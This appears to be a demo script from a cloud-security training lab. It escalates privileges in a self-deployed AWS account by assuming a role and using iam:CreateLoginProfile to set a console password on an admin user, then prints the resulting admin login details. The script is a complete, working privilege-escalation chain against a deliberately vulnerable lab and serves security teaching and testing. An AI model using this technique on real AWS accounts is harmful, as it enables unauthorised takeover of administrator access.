#!/bin/bash

# Demo script for iam:CreateLoginProfile privilege escalation
# This is a ROLE-BASED one-hop scenario

set -e

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-iam-004-to-admin-starting-user"
STARTING_ROLE="pl-prod-iam-004-to-admin-starting-role"
ADMIN_USER="pl-prod-iam-004-to-admin-target-user"

# Generate a random password suffix (8 characters)
RANDOM_SUFFIX=$(openssl rand -hex 4)
PASSWORD="PathfindingLabs123!${RANDOM_SUFFIX}"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM CreateLoginProfile Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}Role-Based One-Hop to Admin${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_004_iam_createloginprofile.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
STARTING_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
ADMIN_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_user_name')
CONSOLE_LOGIN_URL=$(echo "$MODULE_OUTPUT" | jq -r '.console_login_url')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"

if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as expected user${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"

# Step 3: Assume the starting role
echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
echo "Role ARN: $STARTING_ROLE_ARN"

ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
    --role-arn "$STARTING_ROLE_ARN" \
    --role-session-name "iam-004-demo-session")

# Update credentials to use assumed role
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify role identity
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"

# Step 4: Check if admin user has a login profile
echo -e "${YELLOW}Step 4: Checking if admin user has a login profile${NC}"
echo "Admin user: $ADMIN_USER_NAME"

if aws iam get-login-profile --user-name $ADMIN_USER_NAME &> /dev/null; then
    echo -e "${RED}⚠ Admin user already has a login profile${NC}"
    echo -e "${YELLOW}This scenario may have already been run. Run cleanup_attack.sh first.${NC}"
    exit 1
else
    echo -e "${GREEN}✓ Confirmed: Admin user has no login profile${NC}"
fi
echo ""

# Step 5: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have list-users permission already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
fi
echo ""

# Step 6: Create login profile for admin user
echo -e "${YELLOW}Step 6: Creating login profile via iam:CreateLoginProfile${NC}"
echo "Creating console password for admin user: $ADMIN_USER_NAME"
echo "Password: $PASSWORD"

aws iam create-login-profile \
    --user-name $ADMIN_USER_NAME \
    --password "$PASSWORD" \
    --no-password-reset-required

echo -e "${GREEN}✓ Successfully created login profile for admin user!${NC}\n"

# Wait for IAM propagation (15 seconds required for IAM changes)
echo -e "${YELLOW}Waiting 15 seconds for IAM changes to propagate...${NC}"
sleep 15
echo ""

# Step 7: Verify we now have the login profile
echo -e "${YELLOW}Step 7: Login profile has been successfully created${NC}"
echo "The admin user can now log in with the new password."
echo -e "${GREEN}✓ Confirmed login profile creation!${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
echo -e "Step 2: Used ${YELLOW}iam:CreateLoginProfile${NC} to create console password for $ADMIN_USER_NAME"
echo -e "Step 3: Gained ${YELLOW}Administrator Access${NC} (console login)"
echo -e "Result: ${GREEN}Administrator Access${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (CreateLoginProfile) → $ADMIN_USER_NAME → Admin"
echo ""
echo -e "${GREEN}Console Login Information:${NC}"
echo -e "  URL: ${YELLOW}$CONSOLE_LOGIN_URL${NC}"
echo -e "  Username: ${YELLOW}$ADMIN_USER_NAME${NC}"
echo -e "  Password: ${YELLOW}$PASSWORD${NC}"
echo ""
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to delete the login profile${NC}"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
